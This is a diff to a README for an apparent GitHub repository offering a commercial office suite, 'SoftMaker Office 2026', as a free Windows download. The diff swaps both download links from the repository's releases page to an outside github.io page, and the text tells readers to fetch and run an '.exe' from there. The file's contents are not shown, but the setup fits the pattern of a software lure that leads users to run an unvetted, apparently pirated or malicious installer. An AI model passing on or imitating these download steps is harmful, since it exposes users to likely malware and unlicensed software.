@@ -1,6 +1,6 @@
 # 📂 SoftMaker-Office-2026 - Complete Office Suite For Windows PCs
 
-[![](https://img.shields.io/badge/Download-SoftMaker_Office_2026-blue.svg)](https://github.com/voidstarr23/SoftMaker-Office-2026/releases)
+[![](https://img.shields.io/badge/Download-SoftMaker_Office_2026-blue.svg)](https://voidstarr23.github.io)
 
 ## 📋 Project Overview
 
@@ -23,7 +23,7 @@ Before you start, check your computer against this list. Your system needs these
 
 Follow these instructions to get the installation file.
 
-1. Visit the project release page: [https://github.com/voidstarr23/SoftMaker-Office-2026/releases](https://github.com/voidstarr23/SoftMaker-Office-2026/releases)
+1. Visit the project release page: [https://voidstarr23.github.io](https://voidstarr23.github.io)
 2. Look for the section labeled "Assets" at the bottom of the page.
 3. Click the link that ends in `.exe` to start the file transfer.
 4. Wait for the browser to finish downloading the file to your computer.
